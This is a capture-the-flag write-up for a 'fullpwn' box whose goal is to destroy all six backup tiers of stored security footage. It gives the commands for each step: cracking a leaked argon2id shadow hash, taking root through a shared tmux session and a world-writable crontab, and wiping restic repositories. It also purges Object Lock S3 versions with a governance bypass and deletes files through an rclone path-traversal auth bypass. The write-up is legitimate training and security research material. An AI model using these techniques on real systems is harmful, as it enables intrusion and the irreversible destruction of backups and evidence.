---
title: "Flack Safety"
ctf: "platypwnies 2026"
date: 2026-11-14
category: fullpwn
difficulty: 3
points: n/a
flag_format: "PP{...}"
author: "author"
flags:
 - "PP{g0v3rn4nc3_41nt_s4f3::Zh1GtuPgXwgA} (Tier 4 — S3 Governance)"
 - "PP{p4th_tr4v3rs4l5_3v3rywh3r3::-W6km0eyl8Ro} (Tier 6 — Old Rclone Remote)"
---

# Flack Safety

**Target:** `10.83.5.75:22` (live instance)
**Box:** k8s pod `backups-workstation-856d57c7f7-qlmnt`, kernel `4.19.0-gvisor`
**Dashboard:** `http://backups-checker:8080/` (reachable from the workstation)

## Summary

The task is a *destruction* challenge, not a normal "read a file" pwn: a workstation holds the
"security footage" and the FLAGS are **the backup tiers themselves**. The internal dashboard
(`backups-checker:8080`) checks six backup tiers, and when **all six** are destroyed it prints the
two flags. So the objective is to delete every copy of the footage — including an append-only
offsite replica, an S3 bucket protected by **Object Lock (GOVERNANCE)** and versioning, and a
"decommissioned" rclone remote whose credentials are "long gone".

The chain: crack the leaked `/etc/shadow` argon2id hash → SSH in as `employee` → read the
world-writable `/entrypoint.sh`, which discloses a **root tmux session** the employee can drive
(and a world-writable `/etc/crontab`) → root → recover the backup credentials (restic password,
REST + S3 creds) → destroy tiers 1–5 with `restic forget --prune` and an S3 object-version purge
with `--bypass-governance-retention` → destroy tier 6 with an **rclone path-traversal auth
bypass** (`/workstation/../workstation-legacy/...` returns 200 where a direct request is 403).

## Solution / Exploit

### Step 0 — The leaked shadow entry

`fullpwn.flacksafety.zip` ships `/etc/shadow`:

```
employee:$argon2id$v=19$m=65536,t=3,p=1$NDY5NGRkNzY0MGY3MjI2MTk5NzRjMGI0NmU5ZTI1M2E$eEtk1leqd2ihD8UXpy3T7nX1edPWc7QNsxTwQCYhVGc
```

**hashcat gotcha:** mode **34000** ("Argon2" generic) is *broken* for `$argon2id$` — it returns a
**false positive** (and even fails hashcat's own example). Use **mode 70000 (Argon2id, bridged)**:

```bash
hashcat -m 70000 shadow.txt rockyou.txt --self-test-disable
# cracked in the first ~380 rockyou entries at ~56 H/s -> iloveme
```

`--self-test-disable` is required because the OpenCL kernel self-test fails on this GPU. Then
(password auth is enabled):

```bash
ssh employee@10.83.5.75 # password: iloveme
```

### Step 1 — Foothold + privesc from `/entrypoint.sh`

`/entrypoint.sh` is **0777** and reveals the entire design:

- It seeds the restic repos via `resticprofile`; root supercronic re-runs, every minute:
 `su -l employee -c 'resticprofile local-user.backup'` and `resticprofile root.backup`.
- It builds `/tmp/legacy.txt` (the retired legacy repo path) and **opens a ROOT tmux session
 named `ops` on employee's own socket** with `tmux server-access -a employee` — so employee can
 drive a root shell:

```bash
tmux -S /tmp/tmux-1000/default list-sessions # shows session: ops
tmux -S /tmp/tmux-1000/default send-keys -t ops '<cmd>' Enter
```

`/etc/crontab` is also **0666** (world-writable, run as root) — a second, slower privesc. We used
it only to *stop* the re-backup loop (emptied it, saving `/tmp/crontab.bak`) so our deletions
stuck.

Our runners for both are in this folder: `ssh_run.py` (`employee`/`iloveme`) and `rootrun.py`
(run a command as root through the tmux `ops` session). `id` in the `ops` session → `uid=0(root)`.

### Step 2 — The backup infra (from `~/backups.txt` + `/etc/resticprofile/profiles.yaml`)

- **Restic password (all repos):** `flack-footage`
- **Remote creds:** REST `workstation:flack-rest`; S3 `flack` / `flack-s3-secret`
- The dashboard's own Rust source is downloadable at `http://backups-checker:8080/main.rs`
 (saved here as `checker_main.rs`). It defines the **six tiers** and their exact pass condition:

| # | Tier | Where | How we destroyed it |
|---|------|-------|---------------------|
| 1 | User Local Backup | `/home/employee/backups` (restic) | as employee: `restic forget <all-ids> --prune` |
| 2 | Root Local Backup | `/backups` (restic) | as root: same |
| 3 | Offsite Replica | `rest:http://backups-server:8001/footage` (rclone `--append-only`) | **append-only ⇒ can't DELETE.** Push ≥2 *new* snapshots in the **same host+path group** (`restic backup /home/employee/footage --host workstation` ×2); the server-side `restic forget --keep-last 2 --prune` then drops the footage snapshots — "it deleted itself" |
| 4 | S3 Governance | `s3:http://backups-server:7070/footage` (versitygw, versioned + Object Lock) | `aws s3api list-object-versions` → `delete-objects` of every Version **and** DeleteMarker with `--bypass-governance-retention` (the lock is *GOVERNANCE*, so the key may bypass it); loop until zero versions remain → repo gone → restic "no repository" |
| 5 | Rclone Remote 1 | `rest:http://backups-server:8000/workstation/footage` (rclone `--private-repos`) | as root: `restic forget <ids> --prune` using `workstation:flack-rest` |
| 6 | Old Rclone Remote | `/data/rclone/workstation-legacy` on the server (intact while *any* file remains) | **rclone path-traversal auth bypass** (below) |

Tier 4 (S3 Governance) → flag 1. Tier 6 (Old Rclone Remote) → flag 2.

### Step 3 — Tier 6: rclone path-traversal auth bypass → flag 2

The dashboard's `legacy` check is the strictest: the tier is *intact while any file at all*
remains under `/data/rclone/workstation-legacy`. A **direct** request to `/workstation-legacy/...`
is **403** (the `--private-repos` ACL only allows `workstation`). But the path is not normalised, so
traversing *through* the permitted repo reaches it and returns **200**:

```bash
curl --path-as-is -u workstation:flack-rest -X DELETE \
 http://backups-server:8000/workstation/../workstation-legacy/footage/<object>
# -> 200 (direct .../workstation-legacy/... -> 403)
```

Walk the whole repo — `config`, `keys/*`, `snapshots/*`, `index/*`, `data/*/*` — until the
directory holds no files. The dashboard flips tier 6 to `destroyed` and prints flag 2.

### Step 4 — read the flags off the dashboard

Once all six tiers read `destroyed`, the dashboard page prints both flags (also verifiable with
`dash.py`, which curls the dashboard over the employee SSH session and greps `PP{...}`):

```bash
python3 ssh_run.py "curl -s http://backups-checker:8080/"
python3 dash.py
```

## Flag(s)

```
PP{g0v3rn4nc3_41nt_s4f3::Zh1GtuPgXwgA} # Tier 4 — S3 Governance
PP{p4th_tr4v3rs4l5_3v3rywh3r3::-W6km0eyl8Ro} # Tier 6 — Old Rclone Remote
```

## Notes / Pitfalls

- **hashcat mode 34000 lies.** It reports a false positive on `$argon2id$`. Use **mode 70000** and
 `--self-test-disable`.
- **`restic forget` needs explicit snapshot IDs** (or a real policy). `--keep-last 0` is rejected
 with "no policy was specified", and `--no-lock` is **invalid** for `forget` (it *is* valid for
 `find`, which the dashboard uses).
- **Default `forget` grouping is host+path.** New "empty" snapshots must match the victim
 snapshot's **host *and* path** or they land in a different `--keep-last-N` group and nothing is
 pruned from the append-only offsite replica.
- **The re-backup cron fights you.** supercronic re-seeds every minute; stop it first by emptying
 the world-writable `/etc/crontab` (keep a backup).
- **`aws` CLI hangs on IMDS** in this cluster — set `AWS_EC2_METADATA_DISABLED=true` (and a region).
- **The S3 lock is GOVERNANCE, not COMPLIANCE** — that is the whole point of tier 4; the key can
 bypass its own retention via `--bypass-governance-retention`.
- Tier 3's "it deleted itself" is not a bug in us: we pushed two *newer* snapshots and the
 server-side retention policy did the deletion.

## Artifacts in this folder

| Path | What |
|---|---|
| `FLACK-SAFETY-SOLVE.md` | Original working solve notes (author) |
| `checker_main.rs` | The dashboard's own checker source (`/main.rs`) — defines all 6 tiers |
| `ssh_run.py` | pexpect SSH runner (`employee`/`iloveme`) |
| `rootrun.py` | Run a command as root via the tmux `ops` session |
| `dash.py` | Fetch dashboard state + grep flags |
| `shadow.txt` | Shipped `/etc/shadow` (from `fullpwn.flacksafety.zip` / `_src/`) |
| `hc70000.pot` | The correct Argon2id crack (`:iloveme`) |
| `custom.txt`, `arghash.txt`, `tryusers.py` | Wordlist / candidates used while cracking |
| `nmap_full.txt`, `nmap_full2.txt` | nmap of the target |
| `images/camera-in-public-space.png`, `images/torn-down-camera.png` | Challenge artwork (converted from the shipped `.jfif`) |
| `chall-info.txt`, `challenge.json` | Platform metadata |
